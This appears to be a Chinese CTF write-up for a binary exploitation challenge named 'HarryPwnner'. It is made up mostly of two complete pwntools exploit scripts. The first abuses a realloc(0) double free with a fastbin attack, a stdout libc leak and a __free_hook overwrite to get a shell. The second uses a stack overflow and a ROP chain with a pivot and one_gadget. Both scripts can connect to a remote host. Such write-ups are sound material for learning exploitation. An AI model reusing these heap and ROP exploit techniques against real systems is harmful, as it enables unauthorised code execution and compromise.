# HarryPwnner

这题是当时的pwn3

realloc的size为0时，相当于free，于是有一个double free的漏洞,常规的利用

```python

from pwn import *

def cmd(command):
	p.recvuntil(">> ")
	p.sendline(str(command))

def add(sz,content):
	cmd(1)
	p.recvuntil("How much power do you want: ")
	p.sendline(str(sz))
	p.recvuntil("curse: ")
	p.send(content)

def edit(idx,sz,content):
	cmd(2)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(idx))
	p.recvuntil("How much power do you want: ")
	p.sendline(str(sz))
	p.recvuntil("curse: ")
	p.send(content)
	
def dele(idx):
	cmd(3)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(idx))

def main(host, port=9999):
	global p
	if host:
		p = remote(host, port)
	else:
		
		p = process('./HarryPwnner')
		
	
	add(0x68,"A")
	add(0x68,"B")
	add(0x100,"C")
	add(0x68,"D")
	
	dele(2)
	
	cmd(2)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(0))
	p.recvuntil("How much power do you want: ")
	p.sendline(str(0))
	
	dele(1)
	dele(0)
	
	
	add(0x68,p64(0x60303d))
	add(0x68,"A")
	add(0x68,"B")
	buf = 0x000000000603060
	add(0x68,"\x00"*0x13+p64(buf))
	gdb.attach(p,"b *0x000000000401302")
	t = int(raw_input("guess: "))
	stdout = (t << 12) | 0x620
	# stdout = 0xc620
	
	add(0x68,p16(stdout-0x43))
	
	
	
	dele(2)
	dele(1)
	edit(0,0x68,p64(buf)*5+"\x80")
	edit(5,0x68,"\xe0")
	
	add(0x68,"A")
	add(0x68,"/bin/sh\x00")
	add(0x68,"\x00"*0x33+p64(0xfbad1800)+p64(0)*3+"\x00")
	
	# p.recv()
	p.recv(0x40)
	libc.address = u64(p.recv(8))-0x3c5600
	info("libc : " + hex(libc.address))
	
	edit(0,0x68,p64(buf)+p64(libc.symbols["__free_hook"]))
	edit(1,0x68,p64(libc.symbols["system"]))
	
	dele(7)
	
	
	p.interactive()


if __name__ == '__main__':
	libc = ELF("./libc-2.23.so",checksec=False)
	main(args["REMOTE"])


```
赛后交流发现后面还有一个栈溢出的漏洞，当时打比赛的时候知道有这个漏洞，但是不知道怎么利用，太菜了

```python

from pwn import *

def cmd(command):
	p.recvuntil(">> ")
	p.sendline(str(command))

def add(sz,content):
	cmd(1)
	p.recvuntil("How much power do you want: ")
	p.sendline(str(sz))
	p.recvuntil("curse: ")
	p.send(content)

def edit(idx,sz,content):
	cmd(2)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(idx))
	add(sz,content)
	
def dele(idx):
	cmd(3)
	p.recvuntil("Tell me which wand: ")
	p.sendline(str(idx))

def main(host, port=9999):
	global p
	if host:
		p = remote(host, port)
	else:
		
		p = process('./HarryPwnner')
		gdb.attach(p,"b *0x00000000004010D8")
	# p.kill()
	for i in range(0x10):
		add(0x68,"A")
	cmd(4)
	p.recvuntil("How much power do you want?")
	p.sendline(str(0x2000))
	p.recvuntil("Input your final curse:")
	
	# 0x00000000004013f3 : pop rdi ; ret
	# 0x00000000004013f1 : pop rsi ; pop r15 ; ret
	# 0x00000000004013ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
	pppp_ret = 0x00000000004013ed
	p_rsi = 0x00000000004013f1
	p_rdi = 0x00000000004013f3
	bss = 0x0000000000603900 
	
	payload = "Expelliarmus".ljust(0x1010,"\x00")+p64(bss-8)+p64(p_rdi)
	payload += p64(elf.got["puts"])+p64(elf.symbols["puts"])
	payload += p64(p_rdi)+p64(0)+p64(p_rsi)
	payload += p64(bss) +p64(0) + p64(elf.symbols["read"])+p64(pppp_ret)
	payload += p64(bss-0x18)
	payload = payload.ljust(0x2000,"\x00")
	p.send(payload)
	p.recvuntil("enemy's shell.\n")
	libc.address = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))-libc.symbols["puts"]
	# payload = p64(p_rdi)+p64(libc.search("/bin/sh\x00").next())+p64(libc.symbols["system"])
	p.send(p64(libc.address+0xf1147))
	p.interactive()


if __name__ == '__main__':
	libc = ELF("./libc-2.23.so",checksec=False)
	elf = ELF("./HarryPwnner",checksec=False)
	main(args["REMOTE"])
    
```
看了樱花师傅的博客懂的，orz
参考链接： [http://eternalsakura13.com/2018/04/24/starctf_babystack/](http://eternalsakura13.com/2018/04/24/starctf_babystack/)
